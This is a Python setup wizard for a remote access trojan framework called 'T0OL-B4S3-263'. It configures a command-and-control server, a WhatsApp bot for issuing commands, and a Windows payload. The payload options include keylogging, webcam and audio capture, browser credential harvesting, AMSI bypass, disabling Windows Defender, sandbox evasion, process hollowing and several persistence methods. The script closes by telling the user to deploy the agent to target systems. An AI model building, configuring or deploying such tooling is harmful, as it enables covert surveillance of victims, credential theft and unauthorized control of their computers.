#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║              T0OL-B4S3-263 - MASTER SETUP & CONFIGURATION                ║
║                     Ultimate RAT Framework Installer                     ║
║                                                                           ║
║  "Modern Interactive Setup | Real-Time Validation | Production Ready"    ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import subprocess
import platform
import re
import shutil
import secrets
import base64
from pathlib import Path
from datetime import datetime
from typing import Optional, Callable, Dict, List, Tuple

# ═══════════════════════════════════════════════════════════════════════════
# TERMINAL UTILITIES & STYLING
# ═══════════════════════════════════════════════════════════════════════════

class TerminalStyle:
    """Advanced terminal styling with Unicode graphics"""
    
    # ANSI Color codes
    COLORS = {
        'reset': '\033[0m',
        'bold': '\033[1m',
        'dim': '\033[2m',
        'italic': '\033[3m',
        'underline': '\033[4m',
        'blink': '\033[5m',
        'reverse': '\033[7m',
        'hidden': '\033[8m',
        'strikethrough': '\033[9m',
        'black': '\033[30m',
        'red': '\033[31m',
        'green': '\033[32m',
        'yellow': '\033[33m',
        'blue': '\033[34m',
        'magenta': '\033[35m',
        'cyan': '\033[36m',
        'white': '\033[37m',
        'bright_black': '\033[90m',
        'bright_red': '\033[91m',
        'bright_green': '\033[92m',
        'bright_yellow': '\033[93m',
        'bright_blue': '\033[94m',
        'bright_magenta': '\033[95m',
        'bright_cyan': '\033[96m',
        'bright_white': '\033[97m',
    }
    
    # Unicode box drawing characters
    BOX = {
        'h_line': '═',
        'v_line': '║',
        'corner_tl': '╔',
        'corner_tr': '╗',
        'corner_bl': '╚',
        'corner_br': '╝',
        't_join': '╦',
        'b_join': '╩',
        'l_join': '╠',
        'r_join': '╣',
        'cross': '╬',
        'h_line_light': '─',
        'v_line_light': '│',
        'arrow_right': '▶',
        'arrow_left': '◀',
        'bullet': '●',
        'circle': '○',
        'diamond': '◆',
        'check': '✓',
        'cross_mark': '✗',
        'star': '★',
        'warning': '⚠',
        'info': 'ℹ',
    }
    
    @staticmethod
    def color(text: str, color: str) -> str:
        """Apply color to text"""
        if os.name == 'nt':  # Windows doesn't support ANSI by default
            return text
        return f"{TerminalStyle.COLORS.get(color, '')}{text}{TerminalStyle.COLORS['reset']}"
    
    @staticmethod
    def bold(text: str) -> str:
        return TerminalStyle.color(text, 'bold')
    
    @staticmethod
    def success(text: str) -> str:
        return TerminalStyle.color(f"✓ {text}", 'bright_green')
    
    @staticmethod
    def error(text: str) -> str:
        return TerminalStyle.color(f"✗ {text}", 'bright_red')
    
    @staticmethod
    def warning(text: str) -> str:
        return TerminalStyle.color(f"⚠ {text}", 'bright_yellow')
    
    @staticmethod
    def info(text: str) -> str:
        return TerminalStyle.color(f"ℹ {text}", 'bright_blue')
    
    @staticmethod
    def header(text: str, width: int = 80) -> str:
        """Print styled header box"""
        line = TerminalStyle.color(TerminalStyle.BOX['h_line'] * width, 'bright_cyan')
        text_colored = TerminalStyle.color(f"  {text}", 'bright_yellow')
        return f"{line}\n{text_colored}\n{line}"
    
    @staticmethod
    def clear():
        """Clear terminal"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def print_banner():
        """Print fancy banner"""
        TerminalStyle.clear()
        banner = TerminalStyle.color("""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║               T0OL-B4S3-263 - MASTER SETUP WIZARD v2.0                   ║
║                                                                           ║
║          ▶ Modern Interactive Configuration  ▶  Real-Time Validation     ║
║          ▶ Production-Ready  ▶  All Features Included                    ║
║                                                                           ║
║           "Turn Your RAT Into a Professional Penetration Tool"           ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
        """, 'bright_cyan')
        print(banner)


# ═══════════════════════════════════════════════════════════════════════════
# INPUT VALIDATION & PROMPTING
# ═══════════════════════════════════════════════════════════════════════════

class InputValidator:
    """Comprehensive input validation"""
    
    @staticmethod
    def is_valid_ip(ip: str) -> bool:
        """Validate IP address"""
        pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        if not re.match(pattern, ip):
            return False
        parts = [int(x) for x in ip.split('.')]
        return all(0 <= p <= 255 for p in parts)
    
    @staticmethod
    def is_valid_port(port: str) -> bool:
        """Validate port number"""
        try:
            p = int(port)
            return 1 <= p <= 65535
        except:
            return False
    
    @staticmethod
    def is_valid_domain(domain: str) -> bool:
        """Validate domain name"""
        pattern = r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
        return re.match(pattern, domain) is not None
    
    @staticmethod
    def is_valid_phone(phone: str) -> bool:
        """Validate phone number"""
        # Must start with + and contain only digits
        return phone.startswith('+') and phone[1:].replace(' ', '').isdigit()
    
    @staticmethod
    def is_valid_url(url: str) -> bool:
        """Validate URL"""
        pattern = r'^https?://'
        return re.match(pattern, url) is not None
    
    @staticmethod
    def is_strong_password(password: str) -> bool:
        """Validate strong password (min 8 chars, mixed case, numbers, special)"""
        if len(password) < 8:
            return False
        has_upper = any(c.isupper() for c in password)
        has_lower = any(c.islower() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(c in '!@#$%^&*()-_=+[]{}|;:,.<>?' for c in password)
        return has_upper and has_lower and has_digit and has_special


class InteractivePrompt:
    """Advanced interactive prompting system"""
    
    def __init__(self):
        self.config = {}
        self.validated_inputs = {}
    
    def prompt_text(self, prompt: str, default: Optional[str] = None, 
                   validator: Optional[Callable] = None, secret: bool = False) -> str:
        """Prompt for text input with validation"""
        while True:
            display = f"{TerminalStyle.color(prompt, 'bright_cyan')}"
            if default:
                display += f" {TerminalStyle.color(f'[{default}]', 'dim')}"
            display += ": "
            
            try:
                if secret:
                    import getpass
                    user_input = getpass.getpass(display)
                else:
                    user_input = input(display)
            except KeyboardInterrupt:
                print("\n" + TerminalStyle.warning("Setup cancelled"))
                sys.exit(1)
            
            user_input = user_input.strip()
            
            if not user_input:
                if default:
                    return default
                else:
                    print(TerminalStyle.warning("Input required"))
                    continue
            
            if validator:
                if not validator(user_input):
                    print(TerminalStyle.error("Invalid input"))
                    continue
            
            return user_input
    
    def prompt_choice(self, prompt: str, options: Dict[str, str], 
                     default: Optional[str] = None) -> str:
        """Prompt for choice from options"""
        print(f"\n{TerminalStyle.color(prompt, 'bright_yellow')}")
        
        for key, value in options.items():
            marker = ">" if key == default else " "
            print(f"  {marker} [{key}] {value}")
        
        while True:
            choice = input(f"\n{TerminalStyle.color('Select', 'bright_cyan')}: ").strip()
            
            if not choice and default:
                return default
            
            if choice in options:
                return choice
            
            print(TerminalStyle.error("Invalid choice"))
    
    def prompt_yes_no(self, prompt: str, default: bool = True) -> bool:
        """Prompt for yes/no"""
        default_str = "Y/n" if default else "y/N"
        response = self.prompt_text(prompt, default_str, secret=False)
        return response.lower() in ['y', 'yes', '']
    
    def prompt_list_input(self, prompt: str, item_prompt: str = "Item") -> List[str]:
        """Prompt for list of items"""
        items = []
        print(f"\n{TerminalStyle.color(prompt, 'bright_yellow')}")
        print(f"(Leave blank to finish)")
        
        while True:
            item = input(f"{TerminalStyle.color(f'{item_prompt}', 'bright_cyan')}: ").strip()
            if not item:
                break
            items.append(item)
            print(TerminalStyle.success(f"Added: {item}"))
        
        return items


# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURATION MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════

class ConfigurationManager:
    """Manage multi-component configuration"""
    
    CONFIG_FILES = {
        'whatsapp': 'whatsapp-c2/config.json',
        'env': 'whatsapp-c2/.env',
        'python_env': '.env',
    }
    
    def __init__(self, project_root: Path):
        self.project_root = project_root
        self.config = {}
        self.load_existing()
    
    def load_existing(self):
        """Load existing configurations"""
        config_path = self.project_root / self.CONFIG_FILES['whatsapp']
        if config_path.exists():
            try:
                with open(config_path) as f:
                    self.config = json.load(f)
                print(TerminalStyle.success(f"Loaded existing config from {config_path}"))
            except Exception as e:
                print(TerminalStyle.warning(f"Failed to load config: {e}"))
    
    def save_whatsapp_config(self, config: Dict):
        """Save WhatsApp bot configuration"""
        config_path = self.project_root / self.CONFIG_FILES['whatsapp']
        config_path.parent.mkdir(parents=True, exist_ok=True)
        
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        
        print(TerminalStyle.success(f"Saved WhatsApp config to {config_path}"))
    
    def save_env_file(self, env_vars: Dict[str, str]):
        """Save environment variables to .env file"""
        env_path = self.project_root / self.CONFIG_FILES['env']
        env_path.parent.mkdir(parents=True, exist_ok=True)
        
        lines = []
        for key, value in env_vars.items():
            # Quote values with spaces
            if ' ' in str(value):
                value = f'"{value}"'
            lines.append(f"{key}={value}")
        
        with open(env_path, 'w') as f:
            f.write('\n'.join(lines))
        
        print(TerminalStyle.success(f"Saved .env file to {env_path}"))


# ═══════════════════════════════════════════════════════════════════════════
# COMPONENT SETUP CLASSES (ONE TODO EACH)
# ═══════════════════════════════════════════════════════════════════════════

class C2ServerSetup:
    """TODO: Configure C2 Server (RAT controller) with multi-session management"""
    
    def __init__(self, prompt: InteractivePrompt):
        self.prompt = prompt
        self.config = {}
    
    def run(self):
        """Setup C2 Server"""
        print(f"\n{TerminalStyle.header('C2 SERVER CONFIGURATION')}")
        
        print(TerminalStyle.info("Configure the central command & control server"))
        
        # Host configuration
        host = self.prompt.prompt_text(
            "C2 Server Host/IP",
            default="127.0.0.1",
            validator=lambda x: InputValidator.is_valid_ip(x) or InputValidator.is_valid_domain(x)
        )
        
        # Port configuration
        port = self.prompt.prompt_text(
            "C2 Server Port",
            default="4444",
            validator=InputValidator.is_valid_port
        )
        
        # Encryption key
        print(f"\n{TerminalStyle.color('Encryption Key Options:', 'bright_yellow')}")
        key_choice = self.prompt.prompt_choice(
            "Encryption Method",
            {
                'auto': 'Generate random key (recommended)',
                'custom': 'Enter custom key',
                'file': 'Load from file'
            },
            default='auto'
        )
        
        if key_choice == 'auto':
            key = base64.urlsafe_b64encode(secrets.token_bytes(32)).decode()
            print(TerminalStyle.success(f"Generated key: {key[:20]}..."))
        elif key_choice == 'custom':
            key = self.prompt.prompt_text(
                "Encryption Key (min 32 chars)",
                validator=lambda x: len(x) >= 32
            )
        else:
            key_file = self.prompt.prompt_text("Key file path")
            try:
                with open(key_file) as f:
                    key = f.read().strip()
            except:
                key = base64.urlsafe_b64encode(secrets.token_bytes(32)).decode()
                print(TerminalStyle.warning(f"File not found, generated new key"))
        
        # Session settings
        print(f"\n{TerminalStyle.color('Session Management:', 'bright_yellow')}")
        max_sessions = self.prompt.prompt_text(
            "Max concurrent sessions",
            default="100",
            validator=lambda x: x.isdigit() and int(x) > 0
        )
        
        session_timeout = self.prompt.prompt_text(
            "Session timeout (seconds)",
            default="300",
            validator=lambda x: x.isdigit() and int(x) > 0
        )
        
        # Multi-channel support
        enable_multichannel = self.prompt.prompt_yes_no(
            "Enable multi-channel C2? (HTTP/HTTPS/DNS)",
            default=True
        )
        
        self.config = {
            'ratServer': {
                'host': host,
                'port': int(port),
                'encryptionKey': key,
                'apiPort': 5000,
                'maxSessions': int(max_sessions),
                'sessionTimeout': int(session_timeout),
                'multiChannel': enable_multichannel
            }
        }
        
        return self.config


class WhatsAppBotSetup:
    """TODO: Configure WhatsApp Bot (user-friendly C2 interface via WhatsApp)"""
    
    def __init__(self, prompt: InteractivePrompt):
        self.prompt = prompt
        self.config = {}
    
    def run(self):
        """Setup WhatsApp Bot"""
        print(f"\n{TerminalStyle.header('WHATSAPP BOT CONFIGURATION')}")
        
        print(TerminalStyle.info("Configure WhatsApp-based command control interface"))
        
        # Bot name
        bot_name = self.prompt.prompt_text(
            "Bot display name",
            default="T0OL-B4S3-263 C2"
        )
        
        # Command prefix
        prefix = self.prompt.prompt_text(
            "Command prefix",
            default="/",
            validator=lambda x: len(x) == 1
        )
        
        # C2 Server connection
        print(f"\n{TerminalStyle.color('C2 Server Connection:', 'bright_yellow')}")
        rat_host = self.prompt.prompt_text(
            "RAT Server Host",
            default="127.0.0.1",
            validator=lambda x: InputValidator.is_valid_ip(x) or InputValidator.is_valid_domain(x)
        )
        
        rat_port = self.prompt.prompt_text(
            "RAT Server Port",
            default="4444",
            validator=InputValidator.is_valid_port
        )
        
        rat_key = self.prompt.prompt_text(
            "RAT Encryption Key (from C2 setup)",
            validator=lambda x: len(x) >= 32
        )
        
        # Owner authentication
        print(f"\n{TerminalStyle.color('Owner Authentication:', 'bright_yellow')}")
        
        owner_phones = self.prompt.prompt_list_input(
            "Add WhatsApp owner phone numbers",
            "Phone (+1234567890)"
        )
        
        if not owner_phones:
            owner_phones = ["+1234567890"]  # Default
            print(TerminalStyle.warning("No phones added, using default"))
        
        # Validate phones
        owner_phones = [p for p in owner_phones if InputValidator.is_valid_phone(p)]
        
        # Features
        print(f"\n{TerminalStyle.color('Features:', 'bright_yellow')}")
        
        features = {
            'autoSaveMedia': self.prompt.prompt_yes_no("Auto-save media from targets", default=True),
            'enableNotifications': self.prompt.prompt_yes_no("Send notifications to owner", default=True),
            'enableHistory': self.prompt.prompt_yes_no("Keep command history", default=True),
            'enableAudit': self.prompt.prompt_yes_no("Log all commands (audit)", default=True),
        }
        
        # Command timeout
        timeout = self.prompt.prompt_text(
            "Command timeout (milliseconds)",
            default="60000",
            validator=lambda x: x.isdigit() and int(x) > 0
        )
        
        self.config = {
            'ratServer': {
                'host': rat_host,
                'port': int(rat_port),
                'encryptionKey': rat_key,
                'apiPort': 5000
            },
            'whatsapp': {
                'botName': bot_name,
                'prefix': prefix,
                'ownerNumbers': [f"{p}@s.whatsapp.net" for p in owner_phones],
            },
            'features': {
                'autoSaveMedia': features['autoSaveMedia'],
                'maxCommandTimeout': int(timeout),
                'enableNotifications': features['enableNotifications'],
                'enableHistory': features['enableHistory'],
                'enableAudit': features['enableAudit'],
                'logsDirectory': 'logs/whatsapp-c2',
            }
        }
        
        return self.config


class PayloadSetup:
    """TODO: Configure RAT Payload (Windows agent with full capabilities)"""
    
    def __init__(self, prompt: InteractivePrompt):
        self.prompt = prompt
        self.config = {}
    
    def run(self):
        """Setup RAT Payload"""
        print(f"\n{TerminalStyle.header('RAT PAYLOAD CONFIGURATION')}")
        
        print(TerminalStyle.info("Configure Windows agent payload"))
        
        # C2 connection details
        print(f"\n{TerminalStyle.color('C2 Connection:', 'bright_yellow')}")
        
        c2_host = self.prompt.prompt_text(
            "C2 Server Address (for payload)",
            default="192.168.1.201",
            validator=lambda x: InputValidator.is_valid_ip(x) or InputValidator.is_valid_domain(x)
        )
        
        c2_port = self.prompt.prompt_text(
            "C2 Server Port",
            default="4444",
            validator=InputValidator.is_valid_port
        )
        
        # Encryption
        enc_key = self.prompt.prompt_text(
            "Encryption Key (must match C2)",
            validator=lambda x: len(x) >= 32
        )
        
        # Payload behavior
        print(f"\n{TerminalStyle.color('Payload Behavior:', 'bright_yellow')}")
        
        beacon_interval = self.prompt.prompt_text(
            "Beacon interval (seconds)",
            default="30",
            validator=lambda x: x.isdigit() and int(x) > 0
        )
        
        jitter = self.prompt.prompt_text(
            "Jitter (random delay in seconds)",
            default="10",
            validator=lambda x: x.isdigit() and int(x) >= 0
        )
        
        # Surveillance features
        print(f"\n{TerminalStyle.color('Surveillance Features:', 'bright_yellow')}")
        
        features = {
            'keylogger': self.prompt.prompt_yes_no("Enable keylogging", default=True),
            'screenshot': self.prompt.prompt_yes_no("Enable screenshots", default=True),
            'webcam': self.prompt.prompt_yes_no("Enable webcam capture", default=True),
            'audio': self.prompt.prompt_yes_no("Enable audio recording", default=True),
            'clipboard': self.prompt.prompt_yes_no("Monitor clipboard", default=True),
            'browser_harvest': self.prompt.prompt_yes_no("Harvest browser credentials", default=True),
        }
        
        # Evasion techniques
        print(f"\n{TerminalStyle.color('Evasion Techniques:', 'bright_yellow')}")
        
        evasion = {
            'amsi_bypass': self.prompt.prompt_yes_no("AMSI bypass", default=True),
            'defender_disable': self.prompt.prompt_yes_no("Disable Windows Defender", default=True),
            'sandbox_detection': self.prompt.prompt_yes_no("Sandbox detection", default=True),
            'vm_detection': self.prompt.prompt_yes_no("VM detection", default=True),
            'process_hollowing': self.prompt.prompt_yes_no("Process hollowing", default=True),
        }
        
        # Persistence
        print(f"\n{TerminalStyle.color('Persistence Methods:', 'bright_yellow')}")
        
        persistence = {
            'registry': self.prompt.prompt_yes_no("Registry persistence", default=True),
            'startup_folder': self.prompt.prompt_yes_no("Startup folder", default=True),
            'scheduled_task': self.prompt.prompt_yes_no("Scheduled task", default=True),
            'service': self.prompt.prompt_yes_no("Windows Service", default=False),  # Requires admin
        }
        
        self.config = {
            'payload': {
                'c2Host': c2_host,
                'c2Port': int(c2_port),
                'encryptionKey': enc_key,
                'beaconInterval': int(beacon_interval),
                'jitter': int(jitter),
            },
            'surveillance': features,
            'evasion': evasion,
            'persistence': persistence,
        }
        
        return self.config


class SecuritySetup:
    """TODO: Configure security settings (passwords, authentication, encryption levels)"""
    
    def __init__(self, prompt: InteractivePrompt):
        self.prompt = prompt
        self.config = {}
    
    def run(self):
        """Setup security"""
        print(f"\n{TerminalStyle.header('SECURITY CONFIGURATION')}")
        
        print(TerminalStyle.info("Configure authentication and encryption"))
        
        # Admin password
        print(f"\n{TerminalStyle.color('Administrator Authentication:', 'bright_yellow')}")
        
        while True:
            admin_password = self.prompt.prompt_text(
                "Admin password",
                secret=True,
                validator=InputValidator.is_strong_password
            )
            
            confirm = self.prompt.prompt_text(
                "Confirm password",
                secret=True
            )
            
            if admin_password == confirm:
                print(TerminalStyle.success("Password confirmed"))
                break
            else:
                print(TerminalStyle.error("Passwords don't match"))
        
        # Encryption settings
        print(f"\n{TerminalStyle.color('Encryption Settings:', 'bright_yellow')}")
        
        cipher_suite = self.prompt.prompt_choice(
            "Encryption algorithm",
            {
                'fernet': 'Fernet (recommended)',
                'aes': 'AES-256',
                'chacha20': 'ChaCha20-Poly1305'
            },
            default='fernet'
        )
        
        # SSL/TLS
        use_ssl = self.prompt.prompt_yes_no(
            "Use SSL/TLS for communications",
            default=True
        )
        
        if use_ssl:
            ssl_choice = self.prompt.prompt_choice(
                "SSL Certificate",
                {
                    'self': 'Self-signed (for testing)',
                    'letsencrypt': 'Let\'s Encrypt (production)',
                    'custom': 'Custom certificate'
                },
                default='self'
            )
        
        # Rate limiting
        print(f"\n{TerminalStyle.color('Rate Limiting:', 'bright_yellow')}")
        
        enable_ratelimit = self.prompt.prompt_yes_no(
            "Enable command rate limiting",
            default=True
        )
        
        if enable_ratelimit:
            max_commands = self.prompt.prompt_text(
                "Max commands per minute",
                default="60",
                validator=lambda x: x.isdigit() and int(x) > 0
            )
        
        self.config = {
            'security': {
                'adminPassword': admin_password,
                'cipherSuite': cipher_suite,
                'useSSL': use_ssl,
                'sslType': ssl_choice if use_ssl else None,
                'rateLimit': {
                    'enabled': enable_ratelimit,
                    'maxCommandsPerMinute': int(max_commands) if enable_ratelimit else None
                },
            }
        }
        
        return self.config


class DependenciesSetup:
    """TODO: Install Python and Node.js dependencies for all components"""
    
    def __init__(self, project_root: Path):
        self.project_root = project_root
    
    def run(self):
        """Install dependencies"""
        print(f"\n{TerminalStyle.header('DEPENDENCY INSTALLATION')}")
        
        print(TerminalStyle.info("Installing Python and Node.js packages"))
        
        # Python dependencies
        print(f"\n{TerminalStyle.color('Python Dependencies:', 'bright_yellow')}")
        
        py_deps = [
            'cryptography',
            'requests',
            'pynput',
            'pyaudio',
            'opencv-python',
            'pillow',
            'psutil',
            'pyperclip',
        ]
        
        for dep in py_deps:
            print(f"  Installing {dep}...", end=' ')
            result = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', dep],
                capture_output=True
            )
            if result.returncode == 0:
                print(TerminalStyle.color("✓", 'green'))
            else:
                print(TerminalStyle.color("✗", 'red'))
        
        # Node.js dependencies
        print(f"\n{TerminalStyle.color('Node.js Dependencies:', 'bright_yellow')}")
        
        whatsapp_dir = self.project_root / 'whatsapp-c2'
        if whatsapp_dir.exists():
            os.chdir(whatsapp_dir)
            result = subprocess.run(['npm', 'install'], capture_output=True)
            if result.returncode == 0:
                print(TerminalStyle.success("npm packages installed"))
            else:
                print(TerminalStyle.error("npm installation failed"))
        
        print(TerminalStyle.success("Dependencies installed"))


class ValidationAndSummary:
    """TODO: Validate all configurations and display setup summary"""
    
    def __init__(self, configs: Dict):
        self.configs = configs
    
    def validate_all(self) -> Tuple[bool, List[str]]:
        """Validate all configurations"""
        errors = []
        
        # Validate C2 Server
        if 'c2_server' in self.configs:
            c2 = self.configs['c2_server']['ratServer']
            if not InputValidator.is_valid_ip(c2['host']) and not InputValidator.is_valid_domain(c2['host']):
                errors.append("Invalid C2 host")
            if not InputValidator.is_valid_port(str(c2['port'])):
                errors.append("Invalid C2 port")
        
        # Validate WhatsApp
        if 'whatsapp' in self.configs:
            wa = self.configs['whatsapp']
            if not wa['whatsapp']['ownerNumbers']:
                errors.append("No WhatsApp owner numbers configured")
        
        # Validate Payload
        if 'payload' in self.configs:
            p = self.configs['payload']['payload']
            if not InputValidator.is_valid_ip(p['c2Host']) and not InputValidator.is_valid_domain(p['c2Host']):
                errors.append("Invalid payload C2 host")
        
        return len(errors) == 0, errors
    
    def show_summary(self):
        """Display configuration summary"""
        print(f"\n{TerminalStyle.header('CONFIGURATION SUMMARY')}")
        
        # C2 Server
        if 'c2_server' in self.configs:
            c2 = self.configs['c2_server']['ratServer']
            print(TerminalStyle.color("\n[C2 Server]", 'bright_yellow'))
            print(f"  Host: {c2['host']}")
            print(f"  Port: {c2['port']}")
            print(f"  Max Sessions: {c2['maxSessions']}")
            print(f"  Encryption: Fernet (256-bit)")
        
        # WhatsApp
        if 'whatsapp' in self.configs:
            wa = self.configs['whatsapp']['whatsapp']
            print(TerminalStyle.color("\n[WhatsApp Bot]", 'bright_yellow'))
            print(f"  Name: {wa['botName']}")
            print(f"  Prefix: {wa['prefix']}")
            print(f"  Owner Phones: {len(wa['ownerNumbers'])} configured")
        
        # Payload
        if 'payload' in self.configs:
            p = self.configs['payload']['payload']
            print(TerminalStyle.color("\n[RAT Payload]", 'bright_yellow'))
            print(f"  Target: {p['c2Host']}:{p['c2Port']}")
            print(f"  Beacon: Every {p['beaconInterval']}s (±{p['jitter']}s)")
            surveil = self.configs['payload']['surveillance']
            print(f"  Surveillance: {sum(surveil.values())}/{len(surveil)} features")
        
        print(f"\n{TerminalStyle.color('='*80, 'bright_cyan')}")


# ═══════════════════════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════

class MasterSetup:
    """TODO: Orchestrate entire setup process with interactive menu system"""
    
    def __init__(self):
        self.project_root = Path(__file__).parent
        self.prompt = InteractivePrompt()
        self.config_manager = ConfigurationManager(self.project_root)
        self.all_configs = {}
    
    def show_main_menu(self) -> str:
        """Display main menu"""
        print(f"\n{TerminalStyle.header('MAIN MENU')}")
        
        choice = self.prompt.prompt_choice(
            "What would you like to configure?",
            {
                '1': 'C2 Server (Command & Control)',
                '2': 'WhatsApp Bot (Control Interface)',
                '3': 'RAT Payload (Windows Agent)',
                '4': 'Security Settings (Auth & Encryption)',
                '5': 'Install Dependencies',
                '6': 'Validate All Configurations',
                '7': 'Quick Setup (All Components)',
                '8': 'View Configuration Summary',
                '0': 'Exit & Save'
            },
            default='7'
        )
        
        return choice
    
    def quick_setup(self):
        """Run quick setup for all components"""
        print(TerminalStyle.info("Starting complete setup wizard..."))
        
        self.all_configs['c2_server'] = C2ServerSetup(self.prompt).run()
        self.all_configs['whatsapp'] = WhatsAppBotSetup(self.prompt).run()
        self.all_configs['payload'] = PayloadSetup(self.prompt).run()
        self.all_configs['security'] = SecuritySetup(self.prompt).run()
    
    def run(self):
        """Main setup orchestrator"""
        TerminalStyle.print_banner()
        
        print(TerminalStyle.color("""
Welcome to the T0OL-B4S3-263 Master Setup Wizard.

This interactive wizard will configure all components of your RAT framework:
  • C2 Server (command center)
  • WhatsApp Bot (control interface)
  • RAT Payload (Windows agent)
  • Security & Authentication
  • Dependencies

Let's get started!
        """, 'bright_cyan'))
        
        while True:
            choice = self.show_main_menu()
            
            try:
                if choice == '1':
                    self.all_configs['c2_server'] = C2ServerSetup(self.prompt).run()
                
                elif choice == '2':
                    self.all_configs['whatsapp'] = WhatsAppBotSetup(self.prompt).run()
                
                elif choice == '3':
                    self.all_configs['payload'] = PayloadSetup(self.prompt).run()
                
                elif choice == '4':
                    self.all_configs['security'] = SecuritySetup(self.prompt).run()
                
                elif choice == '5':
                    DependenciesSetup(self.project_root).run()
                
                elif choice == '6':
                    validator = ValidationAndSummary(self.all_configs)
                    is_valid, errors = validator.validate_all()
                    if is_valid:
                        print(TerminalStyle.success("All configurations valid!"))
                    else:
                        for error in errors:
                            print(TerminalStyle.error(error))
                
                elif choice == '7':
                    self.quick_setup()
                
                elif choice == '8':
                    ValidationAndSummary(self.all_configs).show_summary()
                
                elif choice == '0':
                    self._save_all_configs()
                    break
            
            except KeyboardInterrupt:
                print("\n" + TerminalStyle.warning("Setup cancelled"))
                sys.exit(1)
            except Exception as e:
                print(TerminalStyle.error(f"Error: {e}"))
    
    def _save_all_configs(self):
        """Save all configurations"""
        print(f"\n{TerminalStyle.header('SAVING CONFIGURATIONS')}")
        
        if self.all_configs.get('whatsapp'):
            self.config_manager.save_whatsapp_config(self.all_configs['whatsapp'])
        
        if self.all_configs.get('c2_server') or self.all_configs.get('payload'):
            env_vars = {}
            if self.all_configs.get('c2_server'):
                c2 = self.all_configs['c2_server']['ratServer']
                env_vars.update({
                    'RAT_SERVER_HOST': c2['host'],
                    'RAT_SERVER_PORT': str(c2['port']),
                    'RAT_ENCRYPTION_KEY': c2['encryptionKey'],
                })
            
            if env_vars:
                self.config_manager.save_env_file(env_vars)
        
        print(TerminalStyle.success("All configurations saved!"))
        print(f"\n{TerminalStyle.color('Next steps:', 'bright_yellow')}")
        print("  1. Review generated config files")
        print("  2. Run the C2 server: python3 rat_server_fixed.py")
        print("  3. Start the WhatsApp bot: npm start (in whatsapp-c2/)")
        print("  4. Deploy rat_ultimate.py to target systems")


# ═══════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    try:
        setup = MasterSetup()
        setup.run()
    except KeyboardInterrupt:
        print("\n" + TerminalStyle.warning("Setup interrupted"))
        sys.exit(1)
    except Exception as e:
        print(TerminalStyle.error(f"Fatal error: {e}"))
        import traceback
        traceback.print_exc()
        sys.exit(1)
